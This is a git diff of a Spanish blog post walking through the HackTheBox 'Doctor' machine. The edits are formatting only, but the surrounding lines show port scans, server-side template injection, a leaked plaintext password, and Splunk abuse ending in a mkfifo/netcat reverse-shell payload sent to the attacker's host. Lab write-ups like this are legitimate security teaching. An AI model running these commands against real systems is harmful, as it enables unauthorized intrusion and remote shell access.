@@ -3,6 +3,8 @@ layout      : post
 title       : "HackTheBox - Doctor"
 image       : https://raw.githubusercontent.com/lanzt/blog/main/assets/images/HTB/doctor/278banner.png
 category    : [ htb ]
+tags        : [ SSTI, logs, splunk ]
+
 ---
 Máquina Linux nivel fácil. Sencilla, pero algo inquietante al inicio, jugaremos con inyección en templates, los logs nos hablarán y romperemos `Splunk` montando servidores fake por todos lados para ejecutar comandos.
 
@@ -30,29 +32,29 @@ He creado un script para la generación del usuario en la web, nos logea, crea e
 
 ### Fases
 
-1. [Enumeración](#enumeración).
-2. [Explotación](#explotación).
+1. [Enumeración](#enumeracion).
+2. [Explotación](#explotacion).
 3. [Escalada de privilegios](#escalada-de-privilegios).
 
 ...
 
-## Enumeración [#](#enumeración) {#enumeración}
+## Enumeración [#](#enumeracion) {#enumeracion}
 
 Como siempre empezamos realizando un escaneo de puertos sobre la maquina para saber que servicios esta corriendo.
 
-```sh
+```bash
 –» nmap -p- --open -v 10.10.10.209
 ```
 
 En este caso vamos a agregarle el parametro `-T` para hacer el escaneo más rapido.
 
-```sh
+```bash
 –» nmap -p- --open -v -T5 10.10.10.209
 ```
 
 Aún sigue lento, cambiemos el `-T` por `--min-rate`:
 
-```sh
+```bash
 –» nmap -p- --open -v --min-rate=2000 10.10.10.209 -oG initScan
 ```
 
@@ -91,7 +93,7 @@ Muy bien, tenemos los siguientes servicios:
 
 Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello obtenemos información más detallada de cada servicio:
 
-```sh
+```bash
 –» nmap -p 22,80 -sC -sV 10.10.10.209 -oN portScan
 ```
 
@@ -102,7 +104,7 @@ Hagamos nuestro escaneo de versiones y scripts en base a cada puerto, con ello o
 | -sV       | Nos permite ver la versión del servicio                |
 | -oN       | Guarda el output en un archivo                         |
 
-```sh
+```bash
 –» cat portScan 
 # Nmap 7.80 scan initiated Wed Dec  9 25:25:25 2020 as: nmap -p 22,80 -sC -sV -oN portScan 10.10.10.209
 Nmap scan report for 10.10.10.209
@@ -130,7 +132,7 @@ Tenemos:
 
 El escaneo total (totalScan) me mostro un nuevo puerto y el tipo de servicio era `unknown`, haciendo el escaneo de versiones y scripts, obtuvimos:
 
-```sh
+```bash
 ...
 8089/tcp open  ssl/http Splunkd httpd
 | http-robots.txt: 1 disallowed entry
@@ -157,7 +159,7 @@ Pero validando en la web `http://10.10.10.209:8089/` sale error, posiblemente po
 
 Enumeremos a ver que podemos encontrar...
 
-```sh
+```bash
 –» cat webScan 
 # Nmap 7.80 scan initiated Wed Dec  9 10:34:55 2020 as: nmap -p 80 --script=http-enum -oN webScan 10.10.10.209
 Nmap scan report for 10.10.10.209
@@ -182,7 +184,7 @@ Encontramos:
 
 Probemos colocando en el `/etc/hosts` el dominio, para que cuando hagamos una petición hacia `10.10.10.209`, nos resuelva hacia `doctors.htb`.
 
-```sh
+```bash
 –» cat /etc/hosts
 ...
 10.10.10.209  doctors.htb
@@ -203,7 +205,7 @@ Perfecto, tenemos la interfaz de `splunk` con algunas rutas, 2 de ellas funciona
 
 Validando el login panel ninguna credencial por default es valida, usando `whatweb` nos indica:
 
-```sh
+```bash
 –» whatweb http://doctors.htb/login?next=%2F
 http://doctors.htb/login?next=%2F [200 OK] Bootstrap[4.0.0], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/1.0.1 Python/3.8.2], IP[10.10.10.209], JQuery, PasswordField[password], Python[3.8.2], Script, Title[Doctor Secure Messaging - Login], Werkzeug[1.0.1]
 ```
@@ -226,7 +228,7 @@ Entramos y tenemos:
 
 Si hacemos un reconocimiento de directorios con [dirsearch](https://github.com/maurosoria/dirsearch) tenemos:
 
-```sh
+```bash
 –» dirsearch.py -u http://doctors.htb -t 50 -w /opt/SecLists/Discovery/Web-Content/raft-small-directories.txt --cookie "session=.eJwlzjFuA0EIheG7TJ0CGGDAl1kxOyBbkRJp166i3N0bpXy_XvH9tK2OPO_t9jxe-dG2x2q3NgtzYBAoa7pNMfauw3Aim2o49iWLaOVwGcmBEVXQ5XpZQo9gItNIcFSB6JIyQXWH5c68rwIiqgE-S4t52aCeITWnDylpF-R15vGvoWvu51Hb8_szv64wcFo4wWRDNyfOJIfyhY5-ueKvs0T7fQMhET1g.X9EN1A.AaNm4WThP6qM6V-ogiPoLgMafAU" -q
 ```
 
@@ -268,7 +270,7 @@ Profundizando encontré [que dependiendo el lenguaje de programación, existen t
 
 ...
 
-## Explotación [#](#explotación) {#explotación}
+## Explotación [#](#explotacion) {#explotacion}
 
 Pero testeando con la página no veía ningún indicio de que algo estuviera pasando al [probar los 3 tipos](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection). Entre de nuevo en "no sé que probar", de un momento a otro recordé a `/archive` (la rua que habíamos encontrado en el fuzz y como comentario en el código HTML), así que la abrí. 
 
@@ -300,14 +302,14 @@ Ponemos en el titulo del post:
 
 Nos ponemos en escucha por el puerto 4433:
 
-```sh
+```bash
 –» nc -nlvp 4433
 listening on [any] 4433 ...
 ```
 
 Vamos a `/archive` y ejecutamos, el resultado que tenemos en consola es:
 
-```sh
+```bash
 connect to [10.10.14.83] from (UNKNOWN) [10.10.10.209] 55928
 root:x:0:0:root:/root:/bin/bash
 ...
@@ -391,7 +393,7 @@ Perfecto, estamos dentro...
 
 (Casi me pasa lo mismo que con la máquina `Cache`, en la que encuentro una contraseña de otro servicio y no lo pruebo como contraseña de sistema y me pongo a enumerar y enumerar, después de tener todo ante mí :P):
 
-```sh
+```bash
 web@doctor:~$ su shaun
 su shaun
 Password: Guitar123
@@ -449,7 +451,7 @@ parser.add_argument('--payload-file', default="pwn.bat")
 
 Usaremos `--payload` en la ejecución para alojar nuestros comandos ;) Generemos una Reverse Shell de una, tomemos el mismo con el que accedimos a `web`.
 
-```sh
+```bash
 –» python3 SplunkWhisperer2/PySplunkWhisperer2/PySplunkWhisperer2_remote.py --payload "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.83 4434 >/tmp/f"
 ```
 
